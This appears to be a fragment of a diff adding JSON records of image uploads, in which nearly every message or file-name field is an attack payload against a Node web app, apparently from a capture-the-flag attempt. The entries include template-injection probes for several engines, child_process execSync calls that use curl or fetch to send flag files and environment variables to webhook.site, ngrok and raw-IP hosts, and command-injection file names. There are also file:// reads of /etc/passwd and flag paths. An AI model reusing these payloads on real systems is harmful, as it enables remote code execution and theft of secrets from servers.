+      "message": "${'https://webhook.site/941f86b4-d1b3-4827-8c22-8c33fe9ffc13/EA_'+btoa(JSON.stringify((typeof process!=='undefined'&&process.env)||{})).replace(/\\+/g,'-').replace(/\\//g,'_').replace(/=+$/,'')}",
+      "createdAt": "2026-08-22T14:13:46Z",
+      "url": "/api/images/335"
+    },
+    {
+      "id": 334,
+      "name": "EB.jpg",
+      "size": 632,
+      "recipient": "luongvd",
+      "message": "${'https://webhook.site/941f86b4-d1b3-4827-8c22-8c33fe9ffc13/EB_'+btoa(Object.getOwnPropertyNames(globalThis).join(',')).replace(/\\+/g,'-').replace(/\\//g,'_').replace(/=+$/,'')}",
+      "createdAt": "2026-08-22T14:13:46Z",
+      "url": "/api/images/334"
+    },
+    {
+      "id": 333,
+      "name": "EG.jpg",
+      "size": 632,
+      "recipient": "luongvd",
+      "message": "${'https://webhook.site/941f86b4-d1b3-4827-8c22-8c33fe9ffc13/EG_'+btoa(typeof process+'|'+typeof require+'|'+typeof fetch+'|'+typeof Buffer+'|'+(globalThis&&globalThis.constructor&&globalThis.constructor.name)).replace(/\\+/g,'-').replace(/\\//g,'_').replace(/=+$/,'')}",
+      "createdAt": "2026-08-22T14:13:46Z",
+      "url": "/api/images/333"
+    },
+    {
+      "id": 321,
+      "name": "probe.jpg",
+      "size": 633,
+      "recipient": "luongvd",
+      "message": "{{range.constructor(\"return global.process.mainModule.require(\\'child_process\\').execSync(\\'sleep 5\\')\")()}}",
+      "createdAt": "2026-08-22T13:49:26Z",
+      "url": "/api/images/321"
+    },
+    {
+      "id": 320,
+      "name": "probe.jpg",
+      "size": 633,
+      "recipient": "luongvd",
+      "message": "{{#with \"s\" as |x|}}{{x.constructor.constructor(\"return global.process.mainModule.require(\\'child_process\\').execSync(\\'sleep 5\\')\")()}}{{/with}}",
+      "createdAt": "2026-08-22T13:49:26Z",
+      "url": "/api/images/320"
+    },
+    {
+      "id": 319,
+      "name": "probe.jpg",
+      "size": 633,
+      "recipient": "luongvd",
+      "message": "<%= require(\"child_process\").execSync(\"sleep 5\") %>",
+      "createdAt": "2026-08-22T13:49:26Z",
+      "url": "/api/images/319"
+    },
+    {
+      "id": 318,
+      "name": "probe.jpg",
+      "size": 633,
+      "recipient": "luongvd",
+      "message": "${require('child_process').execSync('sleep 5')}",
+      "createdAt": "2026-08-22T13:49:26Z",
+      "url": "/api/images/318"
+    },
+    {
+      "id": 317,
+      "name": "probe.jpg",
+      "size": 633,
+      "recipient": "luongvd",
+      "message": "hello",
+      "createdAt": "2026-08-22T13:49:26Z",
+      "url": "/api/images/317"
+    },
+    {
+      "id": 316,
+      "name": "probe.jpg",
+      "size": 633,
+      "recipient": "luongvd",
+      "message": "{{7*7}}",
+      "createdAt": "2026-08-22T13:48:40Z",
+      "url": "/api/images/316"
+    },
+    {
+      "id": 315,
+      "name": "probe.jpg",
+      "size": 633,
+      "recipient": "luongvd",
+      "message": "<%= 7*7 %>",
+      "createdAt": "2026-08-22T13:48:39Z",
+      "url": "/api/images/315"
+    },
+    {
+      "id": 314,
+      "name": "probe.jpg",
+      "size": 633,
+      "recipient": "luongvd",
+      "message": "${7*7}",
+      "createdAt": "2026-08-22T13:48:38Z",
+      "url": "/api/images/314"
+    },
+    {
+      "id": 313,
+      "name": "probe.jpg",
+      "size": 633,
+      "recipient": "luongvd",
+      "message": "{{range.constructor(\"return global.process.mainModule.require(\\'child_process\\').execSync(\\'curl -s https://webhook.site/539cff31-8be7-4d9d-bcac-90c10638062a/nun_probe\\')\")()}}",
+      "createdAt": "2026-08-22T13:48:36Z",
+      "url": "/api/images/313"
+    },
+    {
+      "id": 312,
+      "name": "probe.jpg",
+      "size": 633,
+      "recipient": "luongvd",
+      "message": "{{#with \"s\" as |x|}}{{x.constructor.constructor(\"return global.process.mainModule.require(\\'child_process\\').execSync(\\'curl -s https://webhook.site/539cff31-8be7-4d9d-bcac-90c10638062a/hb_probe\\')\")()}}{{/with}}",
+      "createdAt": "2026-08-22T13:48:35Z",
+      "url": "/api/images/312"
+    },
+    {
+      "id": 311,
+      "name": "probe.jpg",
+      "size": 633,
+      "recipient": "luongvd",
+      "message": "<%= require(\"child_process\").execSync(\"curl -s https://webhook.site/539cff31-8be7-4d9d-bcac-90c10638062a/ejs_probe\") %>",
+      "createdAt": "2026-08-22T13:48:34Z",
+      "url": "/api/images/311"
+    },
+    {
+      "id": 310,
+      "name": "probe.jpg",
+      "size": 633,
+      "recipient": "luongvd",
+      "message": "${fetch('https://webhook.site/539cff31-8be7-4d9d-bcac-90c10638062a/js_probe')}",
+      "createdAt": "2026-08-22T13:48:04Z",
+      "url": "/api/images/310"
+    },
+    {
+      "id": 303,
+      "name": "EF.jpg",
+      "size": 632,
+      "recipient": "luongvd",
+      "message": "${'http://b0df-58-186-122-117.ngrok-free.app/EF_'+btoa(''+(globalThis.FLAG||globalThis.flag||''))}",
+      "createdAt": "2026-08-22T13:22:38Z",
+      "url": "/api/images/303"
+    },
+    {
+      "id": 302,
+      "name": "EI.jpg",
+      "size": 632,
+      "recipient": "luongvd",
+      "message": "${'http://b0df-58-186-122-117.ngrok-free.app/EI_'+btoa((()=>{try{return require('fs').readFileSync('/flag','utf8')}catch(e){try{return require('fs').readFileSync('/flag.txt','utf8')}catch(e2){return 'nofs'}}})())}",
+      "createdAt": "2026-08-22T13:22:38Z",
+      "url": "/api/images/302"
+    },
+    {
+      "id": 301,
+      "name": "ED.jpg",
+      "size": 632,
+      "recipient": "luongvd",
+      "message": "${'http://b0df-58-186-122-117.ngrok-free.app/ED_'+btoa(''+(typeof process!=='undefined'&&process.env&&process.env.FLAG||''))}",
+      "createdAt": "2026-08-22T13:22:38Z",
+      "url": "/api/images/301"
+    },
+    {
+      "id": 300,
+      "name": "EA.jpg",
+      "size": 632,
+      "recipient": "luongvd",
+      "message": "${'http://b0df-58-186-122-117.ngrok-free.app/EA_'+btoa(JSON.stringify(typeof process!=='undefined'?process.env:{}))}",
+      "createdAt": "2026-08-22T13:22:38Z",
+      "url": "/api/images/300"
+    },
+    {
+      "id": 299,
+      "name": "EB.jpg",
+      "size": 632,
+      "recipient": "luongvd",
+      "message": "${'http://b0df-58-186-122-117.ngrok-free.app/EB_'+btoa(Object.keys(globalThis).join(','))}",
+      "createdAt": "2026-08-22T13:22:38Z",
+      "url": "/api/images/299"
+    },
+    {
+      "id": 298,
+      "name": "EG.jpg",
+      "size": 632,
+      "recipient": "luongvd",
+      "message": "${'http://b0df-58-186-122-117.ngrok-free.app/EG_'+btoa(typeof process+'_'+typeof require+'_'+typeof fetch+'_'+globalThis.constructor.name)}",
+      "createdAt": "2026-08-22T13:22:38Z",
+      "url": "/api/images/298"
+    },
+    {
+      "id": 291,
+      "name": "EF.jpg",
+      "size": 632,
+      "recipient": "luongvd",
+      "message": "${'http://b0df-58-186-122-117.ngrok-free.app/EF_'+btoa(''+(globalThis.FLAG||globalThis.flag||''))}",
+      "createdAt": "2026-08-22T13:22:02Z",
+      "url": "/api/images/291"
+    },
+    {
+      "id": 290,
+      "name": "EI.jpg",
+      "size": 632,
+      "recipient": "luongvd",
+      "message": "${'http://b0df-58-186-122-117.ngrok-free.app/EI_'+btoa((()=>{try{return require('fs').readFileSync('/flag','utf8')}catch(e){try{return require('fs').readFileSync('/flag.txt','utf8')}catch(e2){return 'nofs'}}})())}",
+      "createdAt": "2026-08-22T13:22:02Z",
+      "url": "/api/images/290"
+    },
+    {
+      "id": 289,
+      "name": "ED.jpg",
+      "size": 632,
+      "recipient": "luongvd",
+      "message": "${'http://b0df-58-186-122-117.ngrok-free.app/ED_'+btoa(''+(typeof process!=='undefined'&&process.env&&process.env.FLAG||''))}",
+      "createdAt": "2026-08-22T13:22:02Z",
+      "url": "/api/images/289"
+    },
+    {
+      "id": 288,
+      "name": "EA.jpg",
+      "size": 632,
+      "recipient": "luongvd",
+      "message": "${'http://b0df-58-186-122-117.ngrok-free.app/EA_'+btoa(JSON.stringify(typeof process!=='undefined'?process.env:{}))}",
+      "createdAt": "2026-08-22T13:22:02Z",
+      "url": "/api/images/288"
+    },
+    {
+      "id": 287,
+      "name": "EB.jpg",
+      "size": 632,
+      "recipient": "luongvd",
+      "message": "${'http://b0df-58-186-122-117.ngrok-free.app/EB_'+btoa(Object.keys(globalThis).join(','))}",
+      "createdAt": "2026-08-22T13:22:02Z",
+      "url": "/api/images/287"
+    },
+    {
+      "id": 286,
+      "name": "EG.jpg",
+      "size": 632,
+      "recipient": "luongvd",
+      "message": "${'http://b0df-58-186-122-117.ngrok-free.app/EG_'+btoa(typeof process+'_'+typeof require+'_'+typeof fetch+'_'+globalThis.constructor.name)}",
+      "createdAt": "2026-08-22T13:22:02Z",
+      "url": "/api/images/286"
+    },
+    {
+      "id": 283,
+      "name": "tiny_send_probe.jpg",
+      "size": 631,
+      "recipient": "luongvd",
+      "message": "{{7*7}}",
+      "createdAt": "2026-08-22T12:59:55Z",
+      "url": "/api/images/283"
+    },
+    {
+      "id": 281,
+      "name": "Ronaldo Cristiano.png",
+      "size": 100494,
+      "recipient": "luongvd",
+      "message": null,
+      "createdAt": "2026-08-22T12:59:18Z",
+      "url": "/api/images/281"
+    },
+    {
+      "id": 259,
+      "name": "splitjs2.jpg",
+      "size": 632,
+      "recipient": "luongvd",
+      "message": "${fetch('htt'+'p://b0df-58-186-122-117.ngrok-free.app/SPLITJS2')}",
+      "createdAt": "2026-08-22T12:31:50Z",
+      "url": "/api/images/259"
+    },
+    {
+      "id": 258,
+      "name": "splitjs.jpg",
+      "size": 632,
+      "recipient": "luongvd",
+      "message": "${['htt','p://b0df-58-186-122-117.ngrok-free.app/SPLITJS'].join('')}",
+      "createdAt": "2026-08-22T12:31:50Z",
+      "url": "/api/images/258"
+    },
+    {
+      "id": 257,
+      "name": "ctrl.jpg",
+      "size": 632,
+      "recipient": "luongvd",
+      "message": "http://b0df-58-186-122-117.ngrok-free.app/CTRLURL",
+      "createdAt": "2026-08-22T12:31:50Z",
+      "url": "/api/images/257"
+    },
+    {
+      "id": 246,
+      "name": "d.jpg",
+      "size": 632,
+      "recipient": "luongvd",
+      "message": "x",
+      "createdAt": "2026-08-22T09:18:56Z",
+      "url": "/api/images/246"
+    },
+    {
+      "id": 245,
+      "name": "d.jpg",
+      "size": 632,
+      "recipient": "luongvd",
+      "message": "x",
+      "createdAt": "2026-08-22T09:18:56Z",
+      "url": "/api/images/245"
+    },
+    {
+      "id": 244,
+      "name": "d.jpg",
+      "size": 632,
+      "recipient": "luongvd",
+      "message": "x",
+      "createdAt": "2026-08-22T09:18:56Z",
+      "url": "/api/images/244"
+    },
+    {
+      "id": 243,
+      "name": "d.jpg",
+      "size": 632,
+      "recipient": "luongvd",
+      "message": "x",
+      "createdAt": "2026-08-22T09:18:56Z",
+      "url": "/api/images/243"
+    },
+    {
+      "id": 242,
+      "name": "d.jpg",
+      "size": 632,
+      "recipient": "luongvd",
+      "message": "x",
+      "createdAt": "2026-08-22T09:18:56Z",
+      "url": "/api/images/242"
+    },
+    {
+      "id": 241,
+      "name": "d.jpg",
+      "size": 632,
+      "recipient": "luongvd",
+      "message": "x",
+      "createdAt": "2026-08-22T09:18:56Z",
+      "url": "/api/images/241"
+    },
+    {
+      "id": 240,
+      "name": "d.jpg",
+      "size": 632,
+      "recipient": "luongvd",
+      "message": "x",
+      "createdAt": "2026-08-22T09:18:56Z",
+      "url": "/api/images/240"
+    },
+    {
+      "id": 239,
+      "name": "mm.jpg",
+      "size": 632,
+      "recipient": "luongvd",
+      "message": "mm",
+      "createdAt": "2026-08-22T09:18:56Z",
+      "url": "/api/images/239"
+    },
+    {
+      "id": 238,
+      "name": "mm.jpg",
+      "size": 632,
+      "recipient": "luongvd",
+      "message": "mm",
+      "createdAt": "2026-08-22T09:18:56Z",
+      "url": "/api/images/238"
+    },
+    {
+      "id": 237,
+      "name": "mm.jpg",
+      "size": 632,
+      "recipient": "luongvd",
+      "message": "mm",
+      "createdAt": "2026-08-22T09:18:56Z",
+      "url": "/api/images/237"
+    },
+    {
+      "id": 236,
+      "name": "fileurl.jpg",
+      "size": 632,
+      "recipient": "luongvd",
+      "message": "http://91c935fa-e32e-49cc-addb-bdace2234acf.webhook.site/MSG_thenfile",
+      "createdAt": "2026-08-22T09:17:29Z",
+      "url": "/api/images/236"
+    },
+    {
+      "id": 234,
+      "name": "http://91c935fa-e32e-49cc-addb-bdace2234acf.webhook.site/FN_SEND.jpg",
+      "size": 632,
+      "recipient": "luongvd",
+      "message": "hello",
+      "createdAt": "2026-08-22T09:17:29Z",
+      "url": "/api/images/234"
+    },
+    {
+      "id": 233,
+      "name": "msgurl2.jpg",
+      "size": 632,
+      "recipient": "luongvd",
+      "message": "look here http://91c935fa-e32e-49cc-addb-bdace2234acf.webhook.site/MSG_INLINE more",
+      "createdAt": "2026-08-22T09:17:29Z",
+      "url": "/api/images/233"
+    },
+    {
+      "id": 232,
+      "name": "msgurl.jpg",
+      "size": 632,
+      "recipient": "luongvd",
+      "message": "http://91c935fa-e32e-49cc-addb-bdace2234acf.webhook.site/MSG_SEND",
+      "createdAt": "2026-08-22T09:17:29Z",
+      "url": "/api/images/232"
+    },
+    {
+      "id": 229,
+      "name": "imm.jpg",
+      "size": 632,
+      "recipient": "luongvd",
+      "message": "http://bd65-58-186-22-183.ngrok-free.app/IMMEDIATE_TEST",
+      "createdAt": "2026-08-22T08:55:41Z",
+      "url": "/api/images/229"
+    },
+    {
+      "id": 227,
+      "name": "lfi_passwd.jpg",
+      "size": 632,
+      "recipient": "luongvd",
+      "message": "file:///etc/passwd",
+      "createdAt": "2026-08-22T08:51:10Z",
+      "url": "/api/images/227"
+    },
+    {
+      "id": 225,
+      "name": "lfi_appflag.jpg",
+      "size": 632,
+      "recipient": "luongvd",
+      "message": "file:///app/flag",
+      "createdAt": "2026-08-22T08:51:10Z",
+      "url": "/api/images/225"
+    },
+    {
+      "id": 223,
+      "name": "lfi_flagtxt.jpg",
+      "size": 632,
+      "recipient": "luongvd",
+      "message": "file:///flag.txt",
+      "createdAt": "2026-08-22T08:51:10Z",
+      "url": "/api/images/223"
+    },
+    {
+      "id": 221,
+      "name": "lfi_flag.jpg",
+      "size": 632,
+      "recipient": "luongvd",
+      "message": "file:///flag",
+      "createdAt": "2026-08-22T08:51:10Z",
+      "url": "/api/images/221"
+    },
+    {
+      "id": 219,
+      "name": "reflA.jpg",
+      "size": 632,
+      "recipient": "luongvd",
+      "message": "http://bd65-58-186-22-183.ngrok-free.app/REFLA",
+      "createdAt": "2026-08-22T08:46:03Z",
+      "url": "/api/images/219"
+    },
+    {
+      "id": 211,
+      "name": "mathejs.jpg",
+      "size": 632,
+      "recipient": "luongvd",
+      "message": "<%= 6*7 %> http://bd65-58-186-22-183.ngrok-free.app/MATHEJS_marker",
+      "createdAt": "2026-08-22T08:38:47Z",
+      "url": "/api/images/211"
+    },
+    {
+      "id": 210,
+      "name": "reflect.jpg",
+      "size": 632,
+      "recipient": "luongvd",
+      "message": "http://bd65-58-186-22-183.ngrok-free.app/REFLECTSRC",
+      "createdAt": "2026-08-22T08:38:47Z",
+      "url": "/api/images/210"
+    },
+    {
+      "id": 209,
+      "name": "plainurl.jpg",
+      "size": 632,
+      "recipient": "luongvd",
+      "message": "hello http://bd65-58-186-22-183.ngrok-free.app/PLAINURL world",
+      "createdAt": "2026-08-22T08:38:47Z",
+      "url": "/api/images/209"
+    },
+    {
+      "id": 208,
+      "name": "mathhb.jpg",
+      "size": 632,
+      "recipient": "luongvd",
+      "message": "{{#with \"s\" as |x|}}{{x.constructor.constructor(\"return fetch('http://bd65-58-186-22-183.ngrok-free.app/MATHHB_'+(6*7))\")()}}{{/with}}",
+      "createdAt": "2026-08-22T08:38:46Z",
+      "url": "/api/images/208"
+    },
+    {
+      "id": 207,
+      "name": "mathnun.jpg",
+      "size": 632,
+      "recipient": "luongvd",
+      "message": "{{range.constructor(\"return fetch('http://bd65-58-186-22-183.ngrok-free.app/MATHNUN_'+(6*7))\")()}}",
+      "createdAt": "2026-08-22T08:38:46Z",
+      "url": "/api/images/207"
+    },
+    {
+      "id": 206,
+      "name": "mathjs2.jpg",
+      "size": 632,
+      "recipient": "luongvd",
+      "message": "${fetch(`http://bd65-58-186-22-183.ngrok-free.app/MATHJS2_${6*7}`)}",
+      "createdAt": "2026-08-22T08:38:46Z",
+      "url": "/api/images/206"
+    },
+    {
+      "id": 205,
+      "name": "mathjs.jpg",
+      "size": 632,
+      "recipient": "luongvd",
+      "message": "${fetch('http://bd65-58-186-22-183.ngrok-free.app/MATHJS_'+(6*7))}",
+      "createdAt": "2026-08-22T08:38:46Z",
+      "url": "/api/images/205"
+    },
+    {
+      "id": 197,
+      "name": "hb_send.jpg",
+      "size": 632,
+      "recipient": "luongvd",
+      "message": "{{#with \"s\" as |x|}}{{x.constructor.constructor(\"return global.process.mainModule.require('child_process').execSync('curl -s http://bd65-58-186-22-183.ngrok-free.app/hb_send?f=$(cat /flag 2>/dev/null||cat /flag.txt 2>/dev/null||cat /app/flag* 2>/dev/null||env)')\")()}}{{/with}}",
+      "createdAt": "2026-08-22T08:20:49Z",
+      "url": "/api/images/197"
+    },
+    {
+      "id": 196,
+      "name": "nun_send.jpg",
+      "size": 632,
+      "recipient": "luongvd",
+      "message": "{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('curl -s http://bd65-58-186-22-183.ngrok-free.app/nun_send?f=$(cat /flag 2>/dev/null||cat /flag.txt 2>/dev/null||cat /app/flag* 2>/dev/null||env)')\")()}}",
+      "createdAt": "2026-08-22T08:20:49Z",
+      "url": "/api/images/196"
+    },
+    {
+      "id": 195,
+      "name": "ejs2_send.jpg",
+      "size": 632,
+      "recipient": "luongvd",
+      "message": "<% global.process.mainModule.require('child_process').execSync('curl -s http://bd65-58-186-22-183.ngrok-free.app/ejs2_send?e=$(env|base64 -w0)') %>",
+      "createdAt": "2026-08-22T08:20:48Z",
+      "url": "/api/images/195"
+    },
+    {
+      "id": 194,
+      "name": "ejs_send.jpg",
+      "size": 632,
+      "recipient": "luongvd",
+      "message": "<%= global.process.mainModule.require('child_process').execSync('curl -s \"http://bd65-58-186-22-183.ngrok-free.app/ejs_send?f=$(cat /flag 2>/dev/null||cat /flag.txt 2>/dev/null||cat /app/flag* 2>/dev/null||env)\"') %>",
+      "createdAt": "2026-08-22T08:20:48Z",
+      "url": "/api/images/194"
+    },
+    {
+      "id": 193,
+      "name": "jsh_send.jpg",
+      "size": 632,
+      "recipient": "luongvd",
+      "message": "${require('http').get('http://bd65-58-186-22-183.ngrok-free.app/jsh_send?f='+(process.env.FLAG||process.env.flag||''))}",
+      "createdAt": "2026-08-22T08:20:48Z",
+      "url": "/api/images/193"
+    },
+    {
+      "id": 192,
+      "name": "jsf_send.jpg",
+      "size": 632,
+      "recipient": "luongvd",
+      "message": "${fetch('http://bd65-58-186-22-183.ngrok-free.app/jsf_send?f='+encodeURIComponent(JSON.stringify(process.env)))}",
+      "createdAt": "2026-08-22T08:20:48Z",
+      "url": "/api/images/192"
+    },
+    {
+      "id": 191,
+      "name": "js_send.jpg",
+      "size": 632,
+      "recipient": "luongvd",
+      "message": "${require('child_process').execSync('curl -s http://bd65-58-186-22-183.ngrok-free.app/js_send?d='+encodeURIComponent(require('child_process').execSync('cat /flag 2>/dev/null || cat /flag.txt 2>/dev/null || env').toString()))}",
+      "createdAt": "2026-08-22T08:20:48Z",
+      "url": "/api/images/191"
+    },
+    {
+      "id": 190,
+      "name": "c.jpg",
+      "size": 632,
+      "recipient": "luongvd",
+      "message": "|curl http://bd65-58-186-22-183.ngrok-free.app/m4",
+      "createdAt": "2026-08-22T08:18:06Z",
+      "url": "/api/images/190"
+    },
+    {
+      "id": 189,
+      "name": "c.jpg",
+      "size": 632,
+      "recipient": "luongvd",
+      "message": ";curl http://bd65-58-186-22-183.ngrok-free.app/m3;",
+      "createdAt": "2026-08-22T08:18:05Z",
+      "url": "/api/images/189"
+    },
+    {
+      "id": 188,
+      "name": "c.jpg",
+      "size": 632,
+      "recipient": "luongvd",
+      "message": "`curl http://bd65-58-186-22-183.ngrok-free.app/m2`",
+      "createdAt": "2026-08-22T08:18:05Z",
+      "url": "/api/images/188"
+    },
+    {
+      "id": 187,
+      "name": "c.jpg",
+      "size": 632,
+      "recipient": "luongvd",
+      "message": "$(curl http://bd65-58-186-22-183.ngrok-free.app/m1)",
+      "createdAt": "2026-08-22T08:18:05Z",
+      "url": "/api/images/187"
+    },
+    {
+      "id": 186,
+      "name": "a';curl http://bd65-58-186-22-183.ngrok-free.app/ci9;'.jpg",
+      "size": 632,
+      "recipient": "luongvd",
+      "message": "ci",
+      "createdAt": "2026-08-22T08:18:05Z",
+      "url": "/api/images/186"
+    },
+    {
+      "id": 184,
+      "name": "a&&curl$IFS$9http://bd65-58-186-22-183.ngrok-free.app/ci8&&.jpg",
+      "size": 632,
+      "recipient": "luongvd",
+      "message": "ci",
+      "createdAt": "2026-08-22T08:18:04Z",
+      "url": "/api/images/184"
+    },
+    {
+      "id": 182,
+      "name": "$(curl http://bd65-58-186-22-183.ngrok-free.app/ci7).jpg",
+      "size": 632,
+      "recipient": "luongvd",
+      "message": "ci",
+      "createdAt": "2026-08-22T08:18:04Z",
+      "url": "/api/images/182"
+    },
+    {
+      "id": 180,
+      "name": "a%0Acurl http://bd65-58-186-22-183.ngrok-free.app/ci6%0A.jpg",
+      "size": 632,
+      "recipient": "luongvd",
+      "message": "ci",
+      "createdAt": "2026-08-22T08:18:03Z",
+      "url": "/api/images/180"
+    },
+    {
+      "id": 178,
+      "name": "a;curl http://bd65-58-186-22-183.ngrok-free.app/ci5;.jpg",
+      "size": 632,
+      "recipient": "luongvd",
+      "message": "ci",
+      "createdAt": "2026-08-22T08:18:03Z",
+      "url": "/api/images/178"
+    },
+    {
+      "id": 176,
+      "name": "a|curl http://bd65-58-186-22-183.ngrok-free.app/ci4|.jpg",
+      "size": 632,
+      "recipient": "luongvd",
+      "message": "ci",
+      "createdAt": "2026-08-22T08:18:02Z",
+      "url": "/api/images/176"
+    },
+    {
+      "id": 174,
+      "name": "a$(curl http://bd65-58-186-22-183.ngrok-free.app/ci3).jpg",
+      "size": 632,
+      "recipient": "luongvd",
+      "message": "ci",
+      "createdAt": "2026-08-22T08:18:02Z",
+      "url": "/api/images/174"
+    },
+    {
+      "id": 172,
+      "name": "a`curl http://bd65-58-186-22-183.ngrok-free.app/ci2?f=$(cat /flag)`.jpg",
+      "size": 632,
+      "recipient": "luongvd",
+      "message": "ci",
+      "createdAt": "2026-08-22T08:18:01Z",
+      "url": "/api/images/172"
+    },
+    {
+      "id": 170,
+      "name": "a;curl$IFS'http://bd65-58-186-22-183.ngrok-free.app/ci1?f='$(cat$IFS/flag).jpg",
+      "size": 632,
+      "recipient": "luongvd",
+      "message": "ci",
+      "createdAt": "2026-08-22T08:18:01Z",
+      "url": "/api/images/170"
+    },
+    {
+      "id": 168,
+      "name": "x.jpg",
+      "size": 3,
+      "recipient": "luongvd",
+      "message": "x",
+      "createdAt": "2026-08-22T08:13:30Z",
+      "url": "/api/images/168"
+    },
+    {
+      "id": 167,
+      "name": "t.jpg",
+      "size": 632,
+      "recipient": "luongvd",
+      "message": "<%= process.version %>",
+      "createdAt": "2026-08-22T07:58:57Z",
+      "url": "/api/images/167"
+    },
+    {
+      "id": 166,
+      "name": "t.jpg",
+      "size": 632,
+      "recipient": "luongvd",
+      "message": "<%= Object.keys(globalThis) %>",
+      "createdAt": "2026-08-22T07:58:55Z",
+      "url": "/api/images/166"
+    },
+    {
+      "id": 165,
+      "name": "t.jpg",
+      "size": 632,
+      "recipient": "luongvd",
+      "message": "<%= JSON.stringify(process.env) %>",
+      "createdAt": "2026-08-22T07:58:53Z",
+      "url": "/api/images/165"
+    },
+    {
+      "id": 164,
+      "name": "t.jpg",
+      "size": 632,
+      "recipient": "luongvd",
+      "message": "<%= require('child_process').execSync('curl https://webhook.site/aed5af74-b3bd-4477-84ec-9cd96c337dd0?rce=$(cat /flag* 2>/dev/null)') %>",
+      "createdAt": "2026-08-22T07:58:51Z",
+      "url": "/api/images/164"
+    },
+    {
+      "id": 159,
+      "name": "t.jpg",
+      "size": 632,
+      "recipient": "luongvd",
+      "message": "<%= require('http').get('https://webhook.site/aed5af74-b3bd-4477-84ec-9cd96c337dd0?ejs='+process.env.FLAG) %>",
+      "createdAt": "2026-08-22T07:54:50Z",
+      "url": "/api/images/159"
+    },
+    {
+      "id": 158,
+      "name": "t.jpg",
+      "size": 632,
+      "recipient": "luongvd",
+      "message": "<%= require('child_process').execSync('curl https://webhook.site/aed5af74-b3bd-4477-84ec-9cd96c337dd0?ejs=$(cat /flag)') %>",
+      "createdAt": "2026-08-22T07:54:49Z",
+      "url": "/api/images/158"
+    },
+    {
+      "id": 157,
+      "name": "t.jpg",
+      "size": 632,
+      "recipient": "luongvd",
+      "message": "<%= fetch('https://webhook.site/aed5af74-b3bd-4477-84ec-9cd96c337dd0?ejs='+encodeURIComponent(process.env.FLAG)).then(r=>r.text()) %>",
+      "createdAt": "2026-08-22T07:54:48Z",
+      "url": "/api/images/157"
+    },
+    {
+      "id": 156,
+      "name": "t.jpg",
+      "size": 632,
+      "recipient": "luongvd",
+      "message": "prefix <%= 7*7 %> suffix",
+      "createdAt": "2026-08-22T07:54:32Z",
+      "url": "/api/images/156"
+    },
+    {
+      "id": 155,
+      "name": "t.jpg",
+      "size": 632,
+      "recipient": "luongvd",
+      "message": "<%= 'HELLO' %>",
+      "createdAt": "2026-08-22T07:54:31Z",
+      "url": "/api/images/155"
+    },
+    {
+      "id": 154,
+      "name": "t.jpg",
+      "size": 632,
+      "recipient": "luongvd",
+      "message": "<%= 1+1 %>",
+      "createdAt": "2026-08-22T07:54:31Z",
+      "url": "/api/images/154"
+    },
+    {
+      "id": 142,
+      "name": "t.jpg",
+      "size": 22,
+      "recipient": "luongvd",
+      "message": "PING_http://103.116.52.43:8000/ping_marker",
+      "createdAt": "2026-08-22T07:47:21Z",
+      "url": "/api/images/142"
+    },
+    {
+      "id": 141,
+      "name": "t.jpg",
+      "size": 22,
+      "recipient": "luongvd",
+      "message": "{{range.constructor(\"return global.process.mainModule.require('http').get('http://103.116.52.43:8000/nun?f='+global.process.env.FLAG)\")()}}",
+      "createdAt": "2026-08-22T07:47:21Z",
+      "url": "/api/images/141"
+    },
+    {
+      "id": 140,
+      "name": "t.jpg",
+      "size": 22,
+      "recipient": "luongvd",
+      "message": "{{#with \"s\" as |x|}}{{x.constructor.constructor('return process.env.FLAG')()}}{{/with}}",
+      "createdAt": "2026-08-22T07:47:21Z",
+      "url": "/api/images/140"
+    },
+    {
+      "id": 139,
+      "name": "t.jpg",
+      "size": 22,
+      "recipient": "luongvd",
+      "message": "${require('child_process').execSync('curl \"http://103.116.52.43:8000/cp?f=$(cat /flag* /flag.txt 2>/dev/null|head -c200)\"')}",
+      "createdAt": "2026-08-22T07:47:21Z",
+      "url": "/api/images/139"
+    },
+    {
+      "id": 138,
+      "name": "t.jpg",
+      "size": 22,
+      "recipient": "luongvd",
+      "message": "${require('http').get('http://103.116.52.43:8000/jsH?f='+(process.env.FLAG||''))}",
+      "createdAt": "2026-08-22T07:47:20Z",
+      "url": "/api/images/138"
+    },
+    {
+      "id": 137,
+      "name": "t.jpg",
+      "size": 22,
+      "recipient": "luongvd",
+      "message": "${fetch('http://103.116.52.43:8000/jsA?f='+encodeURIComponent(process.env.FLAG||''))}",
+      "createdAt": "2026-08-22T07:47:20Z",
+      "url": "/api/images/137"
+    },
+    {
+      "id": 136,
+      "name": "t.jpg",
+      "size": 22,
+      "recipient": "luongvd",
+      "message": "${fetch('http://103.116.52.43:8000/jsL?f='+encodeURIComponent(process.env.FLAG||''))}",
+      "createdAt": "2026-08-22T07:47:20Z",
+      "url": "/api/images/136"
+    },
+    {
+      "id": 135,
+      "name": "tmp_upload.jpg",
+      "size": 632,
+      "recipient": "luongvd",
+      "message": "{{#with \"s\" as |x|}{x.constructor.constructor('fetch(\\\"https://webhook.site/aed5af74-b3bd-4477-84ec-9cd96c337dd0?hb=\\\"+encodeURIComponent(process.env.FLAG))')()}{{/with}}",
+      "createdAt": "2026-08-22T07:47:16Z",
+      "url": "/api/images/135"
+    },
+    {
+      "id": 134,
+      "name": "tmp_upload.jpg",
+      "size": 632,
+      "recipient": "luongvd",
+      "message": "${fetch('https://webhook.site/aed5af74-b3bd-4477-84ec-9cd96c337dd0?js='+encodeURIComponent(process.env.FLAG))}",
+      "createdAt": "2026-08-22T07:47:15Z",
+      "url": "/api/images/134"
+    },
+    {
+      "id": 133,
+      "name": "tmp_upload.jpg",
+      "size": 632,
+      "recipient": "luongvd",
+      "message": "{{7*7}}",
+      "createdAt": "2026-08-22T07:45:39Z",
+      "url": "/api/images/133"
+    },
+    {
+      "id": 132,
+      "name": "tmp_upload.jpg",
+      "size": 632,
+      "recipient": "luongvd",
+      "message": "${7*7}",
+      "createdAt": "2026-08-22T07:45:38Z",
+      "url": "/api/images/132"
+    },
+    {
+      "id": 123,
+      "name": "t.jpg",
+      "size": 22,
+      "recipient": "luongvd",
+      "message": "EVALCHK1462478703${7*7}",
+      "createdAt": "2026-08-22T07:36:02Z",
+      "url": "/api/images/123"
+    },
+    {
+      "id": 115,
+      "name": "mini.jpg",
+      "size": 632,
+      "recipient": "luongvd",
+      "message": "MASSTEST",
+      "createdAt": "2026-08-22T07:11:00Z",
+      "url": "/api/images/115"
+    },
+    {
+      "id": 113,
+      "name": "tiny.jpg",
+      "size": 22,
+      "recipient": "luongvd",
+      "message": "SSTITEST_{{7*7}}_${7*7}_<%= 7*7 %>",
+      "createdAt": "2026-08-22T06:58:56Z",
+      "url": "/api/images/113"
+    },
+    {
